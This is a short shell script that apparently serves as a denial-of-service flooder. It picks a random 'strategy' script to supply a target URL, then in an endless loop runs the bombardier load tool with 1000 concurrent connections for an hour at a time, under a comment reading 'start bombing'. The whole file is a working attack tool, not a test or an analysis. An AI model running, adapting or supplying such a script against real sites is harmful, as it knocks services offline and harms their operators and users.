#!/bin/sh

STRATEGY=${1:-$(ls strategies/resources | shuf | head -n1 | rev | cut -c 4- | rev)}

while true; do
  # get random resource from random strategy
  RESOURCE=$(sh "strategies/resources/${STRATEGY}.sh")

  # start bombing
  bombardier -c 1000 -d 3600s -l "$RESOURCE"
done
